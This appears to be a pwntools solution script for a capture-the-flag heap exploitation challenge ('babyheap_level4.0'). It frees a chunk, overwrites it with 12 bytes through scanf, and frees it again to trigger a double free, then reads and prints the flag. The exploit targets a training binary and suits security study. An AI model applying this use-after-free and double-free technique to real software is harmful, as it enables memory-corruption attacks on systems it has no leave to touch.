from pwn import *
p = process("/challenge/babyheap_level4.0")
p.sendline(b'malloc')
p.sendline(b'329')
p.sendline(b'free')
p.sendline(b"scanf")
p.sendline(b"A"*12)
p.sendline(b"free")
p.sendline(b'read_flag')

p.sendline(b'puts')
p.interactive()
